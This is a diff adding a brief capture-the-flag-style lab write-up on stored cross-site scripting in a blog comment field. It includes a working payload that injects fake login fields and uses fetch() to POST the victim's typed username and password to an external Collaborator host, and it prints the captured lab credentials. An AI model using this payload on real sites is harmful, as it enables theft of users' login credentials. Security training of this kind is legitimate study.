@@ -1,0 +1,23 @@
+LAB INFO:  Exploiting cross-site scripting to capture passwords
+
+
+MORE INFO: Contains stored xss in blog comment field, A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 
+
+
+ANALYSIS:
+1.  I do comment there and the comment field,name field and website field were reflected back
+2. So, one by one we will check for xss in each field, this time we don't popup the alert but try to show it in the cosole.
+     2.1 <script>console.log("XSS IS HERE");</script>
+           2.1.1. And the XSS IS HERE is shown in the console hai ta. 
+3. Now as per lab our work is to steal the username and password of the victim and login there.
+  3.1 <input name=username id=username>
+    <input type=password name=password onchange="if(this.value.length) fetch('https://1cec6dlkl3ee597gjlshbohnze55tzho.oastify.com', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: username.value+':'+this.value
+    });">
+
+4. Since by using this and looking into the burp collabator we get the username and password of the victim i.e 
+        administrator:wjrsesru5yww8uhy1kx8
+
+HENCE WE SOLVED THE LAB.
